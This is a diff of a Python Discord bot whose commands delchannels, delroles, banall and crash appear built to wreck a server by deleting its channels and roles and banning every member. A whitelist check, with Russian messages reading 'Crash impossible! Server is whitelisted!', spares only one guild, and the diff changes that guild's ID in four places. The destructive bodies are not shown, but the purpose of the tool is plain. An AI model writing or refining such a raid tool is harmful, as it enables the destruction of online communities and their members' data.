@@ -15,7 +15,7 @@ async def delchannels(ctx):
    guild = ctx.guild
    channels = guild.channels
    author = ctx.author
-   g = 767776281701253130
+   g = 769221032410087424
    if guild.id == g:
     await ctx.message.delete()
     await author.send('Краш невозможен! Сервер в белом списке!')
@@ -32,7 +32,7 @@ async def delroles(ctx):
    guild = ctx.guild
    author = ctx.author
    roles = guild.roles
-   g = 767776281701253130
+   g = 769221032410087424
    if guild.id == g:
     await ctx.message.delete()
     await author.send('Краш невозможен! Сервер в белом списке!')
@@ -49,7 +49,7 @@ async def banall(ctx):
   guild = ctx.guild
   members = guild.members
   author = ctx.author
-  g = 767776281701253130
+  g = 769221032410087424
   if guild.id == g:
     await ctx.message.delete()
     await author.send('Краш невозможен! Сервер в белом списке!')
@@ -70,7 +70,7 @@ async def crash(ctx):
     roles = guild.roles
     author = ctx.author
     gid = ctx.guild.id
-    g = 76777628170125313
+    g = 769221032410087424
     if guild.id == g:
      await ctx.message.delete()
      await author.send('Краш невозможен! Сервер в белом списке!')
